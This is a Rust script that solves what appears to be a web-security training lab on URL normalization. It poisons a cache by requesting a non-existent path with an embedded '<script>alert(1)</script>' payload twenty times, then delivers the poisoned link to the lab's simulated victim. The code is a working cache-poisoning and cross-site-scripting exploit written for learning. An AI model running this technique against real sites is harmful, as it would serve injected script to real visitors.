/*****************************************************************
*
* Lab: URL normalization
*
* Hack Steps:
*      1. Send multiple request to a non-exist path to cache it
*         with the injected payload
*      2. Deliver the link to the victim
*
******************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a7000050402b7fe81c048dc00eb00e2.web-security-academy.net";

fn main() {
    let non_exist = "hack"; // You can change this to what you want
    let payload = format!("/{non_exist}<script>alert(1)</script>");

    // 5 times is enough for caching
    // 20 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
    for i in 1..=20 {
        print!("\r⦗1⦘ Poisoning a non-existent path with the injected payload ({i}/20).. ");
        flush_terminal();

        // minreq will not make the URL percent-encoded which is necessary to solve this lab
        minreq::get(&format!("{LAB_URL}{payload}")).send().unwrap();
    }

    println!("{}", "OK".green());
    println!("🗹 The path is poisoned successfully");
    print!("⦗2⦘ Delivering the link to the victim.. ");
    flush_terminal();

    deliver_link_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_link_to_victim(payload: &str) -> Response {
    let client = build_web_client();
    client
        .post(format!("{LAB_URL}/deliver-to-victim"))
        .form(&HashMap::from([("answer", format!("{LAB_URL}{payload}"))]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the link to the victim".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
